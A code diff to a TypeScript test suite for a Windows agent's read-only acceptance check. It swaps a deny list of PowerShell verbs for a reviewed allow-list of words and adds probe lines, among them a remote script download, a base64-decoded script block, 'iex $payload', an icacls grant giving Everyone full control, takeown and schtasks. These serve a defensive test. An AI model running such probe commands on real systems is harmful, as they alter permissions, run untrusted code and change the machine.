@@ -170,21 +170,49 @@ test("the installer refuses a source anyone but SYSTEM and administrators can ch
   assert.match(code, /finally \{[\s\S]*Remove-Item -LiteralPath \$incoming/);
 });
 
-test("the acceptance check only reads: it changes nothing but its own results file, prints no secret, and ships with the agent", () => {
+/**
+ * Every word the acceptance check's code may use, once comments, the help block and the contents of strings are taken out: PowerShell
+ * keywords and operators, its own functions and parameters, and the read-only cmdlets, .NET types, methods and properties it calls.
+ * Each was reviewed as reading, never changing, the machine; the three writes it makes (New-Item and WriteAllText for its own results,
+ * Out-Null) are held to their one use below. A word not on this list fails the test, so a new call of any kind (a download, a registry
+ * or file write, an external program, a script block built from text) has to be added here, in review, on purpose (review of #217).
+ */
+const ACCEPTANCE_VOCABULARY = new Set(`access accesscontrol accesscontroltype account add add-result administrator adsi algorithm and asyncwaithandle at band
+  beginconnect buildnumber caption catch check close cmdletbinding collections computer connected container contains continue convertfrom-json
+  convertto-json count default depth descending detail directory else elseif environment eq erroraction exception exit file filesystemrights filter
+  finally first force foreach foregroundcolor fullname function generic get-acl get-authenticodesignature get-childitem get-ciminstance get-content
+  get-date get-filehash get-item get-sid get-untrustedwriters getcurrent getowner gettype gt hash host identityreference if in include int invoke
+  invoke-check invokemember io is64bitoperatingsystem isinrole itemtype join join-path lastwritetimeutc le leaf list literalpath message name ne net
+  new-item new-object not notcontains ntaccount object or ordered out-null padright param passed path pathtype platformserver port principal
+  productversion psversion raw readonlymode recurse results return scriptblock security securityidentifier select-object sha256 silentlycontinue
+  sockets sort-object split startmode startname state status string substring switch system tcpclient test-path text tostring totalminutes
+  touniversaltime translate try unique utf8encoding value versioninfo waitone where-object win32_operatingsystem win32_service windowsbuiltinrole
+  windowsidentity windowsprincipal write-host writealltext`.split(/\s+/).filter(Boolean));
+
+/** The acceptance check's code: no help block, no comment lines, every string emptied. */
+function acceptanceCode(text: string): string {
+  return text.replace(/<#[\s\S]*?#>/g, "").split("\n").filter(l => !l.trim().startsWith("#")).join("\n")
+    .replace(/'(?:[^']|'')*'/g, "''").replace(/"(?:[^"`]|`.)*"/g, '""');
+}
+/** The words outside the vocabulary: variables are names, not calls, so they are left out. */
+function unknownWords(text: string): string[] {
+  const words = acceptanceCode(text).replace(/\$[A-Za-z_]\w*(:[A-Za-z_]\w*)?/g, "").match(/[A-Za-z][A-Za-z0-9_.-]*/g) ?? [];
+  return [...new Set(words.flatMap(w => w.split(".")).filter(Boolean).map(w => w.toLowerCase()))].filter(w => !ACCEPTANCE_VOCABULARY.has(w)).sort();
+}
+
+test("the acceptance check only reads: every word of its code is on a reviewed list, and its few writes are its own results", () => {
   const text = readFileSync(join(installDir, "Test-CabinetAgent.ps1"), "utf8");
-  // The code alone: the help block (<# ... #>) and comment lines describe what it does not do, in words.
+  assert.deepEqual(unknownWords(text), [], "a word outside the reviewed vocabulary: review what it does, and add it only if it reads");
+  // Text is run only through a word on the list; the forms that could run text are held to their one reading use.
   const code = text.replace(/<#[\s\S]*?#>/g, "").split("\n").filter(l => !l.trim().startsWith("#")).join("\n");
-  // Nothing that changes the machine: services, permissions, files, the registry, processes, the network configuration.
-  for (const verb of ["Set-Acl", "Set-Service", "New-Service", "Stop-Service", "Start-Service", "Restart-Service", "Remove-Item", "Set-ItemProperty", "New-ItemProperty",
-    "Copy-Item", "Move-Item", "Stop-Process", "Start-Process", "sc.exe", "netsh", "reg.exe", "Invoke-Expression", "iex ", "Invoke-WebRequest", "Invoke-RestMethod", "Add-Content", "Set-Content", "Out-File"])
-    assert.ok(!code.includes(verb), `the acceptance check must not use ${verb}`);
-  // The one write: its own results folder.
-  const writes = [...code.matchAll(/WriteAllText\(([^,]+),/g)].map(m => m[1]!.trim());
-  assert.deepEqual(writes, ["$outFile"]);
-  assert.ok(code.includes("Join-Path $env:ProgramData 'Mashura\\CabinetAgent-Acceptance'"), "results go to their own folder");
+  assert.deepEqual([...code.matchAll(/&\s*([^\s(]+)/g)].map(m => m[1]), ["$Body"], "the call operator runs only each check's own script block");
+  assert.deepEqual([...code.matchAll(/\.Invoke\(([^)]*)\)/g)].map(m => m[1]), ["'Members'"], "Invoke only lists the Administrators group");
+  assert.ok([...code.matchAll(/InvokeMember\(([^,]+),\s*([^,]+),/g)].every(m => m[2]!.trim() === "'GetProperty'"), "InvokeMember only reads a property");
+  assert.equal([...code.matchAll(/^\s*\.\s/gm)].length, 0, "nothing is dot-sourced");
+  // The writes: its own results folder and file, once each.
+  assert.deepEqual([...code.matchAll(/WriteAllText\(([^,]+),/g)].map(m => m[1]!.trim()), ["$outFile"]);
   assert.equal([...code.matchAll(/New-Item /g)].length, 1, "the only folder it creates is the results folder");
-  // It never opens a token, a key or the certificate store, and prints only the server address from the configuration.
-  for (const secret of ["token", "Cng", "Cert:", "X509Store", "private"]) assert.ok(!code.toLowerCase().includes(secret.toLowerCase()), `the acceptance check must not touch ${secret}`);
+  assert.ok(code.includes("Join-Path $env:ProgramData 'Mashura\\CabinetAgent-Acceptance'"), "results go to their own folder");
   // A tool reads the exit code: 0 when nothing failed, 1 when something did.
   assert.ok(code.includes("if ($failed -gt 0) { exit 1 }") && code.trimEnd().endsWith("exit 0"));
   // Shipped in the package, left on the cabinet by the installer, and removed by the uninstaller.
@@ -192,4 +220,29 @@ test("the acceptance check only reads: it changes nothing but its own results fi
   assert.ok(readFileSync(join(installDir, "Install-CabinetAgent.ps1"), "utf8").includes("'Test-CabinetAgent.ps1'"), "the installer leaves it on the cabinet");
   const uninstall = readFileSync(join(installDir, "Uninstall-CabinetAgent.ps1"), "utf8");
   assert.ok(uninstall.includes("Mashura\\Test-CabinetAgent.ps1") && uninstall.includes("Mashura\\CabinetAgent-Acceptance"), "the uninstaller removes it and, with -RemoveData, its results");
+});
+
+test("the reviewed vocabulary refuses the writes a word list missed (review of #217)", () => {
+  const base = readFileSync(join(installDir, "Test-CabinetAgent.ps1"), "utf8");
+  const probes: [string, string][] = [
+    ["a download", `(New-Object Net.WebClient).DownloadFile("https://example.invalid/a.ps1", (Join-Path $env:TEMP "a.ps1"))`],
+    ["a registry delete", `[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SOFTWARE\\Mashura", $true).DeleteValue("X")`],
+    ["a script block from text", `([ScriptBlock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("U2V0LVNlcnZpY2U=")))).Invoke()`],
+    ["a .NET file write", `[IO.File]::WriteAllBytes("C:\\x", [byte[]]@())`],
+    ["a .NET folder delete", `[IO.Directory]::Delete("C:\\x", $true)`],
+    ["a machine environment variable", `[Environment]::SetEnvironmentVariable("X", "1", "Machine")`],
+    ["an external program", `icacls "C:\\Program Files\\Mashura" /grant Everyone:F`],
+    ["taking ownership", `takeown /f "C:\\x"`],
+    ["a scheduled task", `schtasks /create /tn x /tr calc.exe`],
+    ["clearing a file", `Clear-Content -LiteralPath "C:\\x"`],
+    ["a registry property", `Remove-ItemProperty -Path HKLM:\\SOFTWARE\\X -Name Y`],
+    ["the call operator on text", `& "C:\\Windows\\System32\\cmd.exe"`],
+    ["an alias of Invoke-Expression", `iex $payload`],
+  ];
+  for (const [what, line] of probes) {
+    const text = base.replace("$results = New-Object", `${line}\n$results = New-Object`);
+    const code = acceptanceCode(text);
+    const caught = unknownWords(text).length > 0 || [...code.matchAll(/&\s*([^\s(]+)/g)].length > 1 || [...code.matchAll(/\.Invoke\(([^)]*)\)/g)].some(m => m[1] !== "''");
+    assert.ok(caught, `${what} would pass: ${line}`);
+  }
 });
